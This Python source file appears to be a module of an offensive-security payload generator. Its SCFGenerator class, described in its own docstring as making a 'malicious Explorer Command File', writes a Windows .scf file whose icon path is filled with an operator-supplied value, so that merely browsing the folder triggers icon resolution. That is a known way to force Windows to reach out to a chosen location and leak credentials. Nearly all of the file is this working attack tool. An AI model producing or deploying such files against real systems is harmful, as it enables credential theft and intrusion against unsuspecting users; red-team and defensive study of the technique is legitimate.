#!/usr/bin/env python
# encoding: utf-8

import logging
from modules.mp_generator import Generator
import re, os
from common import utils
from vbLib import Base64ToBin, CreateBinFile
import base64

SCF_TEMPLATE = \
r"""
[Shell]
Command=2
IconFile=<<<ICON_FILE>>>
[Taskbar]
Command=ToggleDesktop
"""

class SCFGenerator(Generator):
    """ Module used to generate malicious Explorer Command File"""
    
    def check(self):
        return True
        
    
    def generate(self):
                
        logging.info(" [+] Generating %s file..." % self.outputFileType)
        
        # Read command file
        commandFile =self.getCMDFile()    
        if commandFile == "":
            logging.error("   [!] Could not find cmd input!")
            return()
        
        with open (commandFile, "r") as f:
            iconFile=f.read()[:-1]
        
        # Write VBS in template
        scfContent = SCF_TEMPLATE
        scfContent = scfContent.replace("<<<ICON_FILE>>>", iconFile)
             
        # Write in new SCF file
        f = open(self.outputFilePath, 'w')
        f.writelines(scfContent)
        f.close()
        
        logging.info("   [-] Generated SCF file: %s" % self.outputFilePath)
        logging.info("   [-] Test with: \nBrowse %s dir to trigger icon resolution. Click on file to toggle desktop.\n" % self.outputFilePath)
        

        
        
        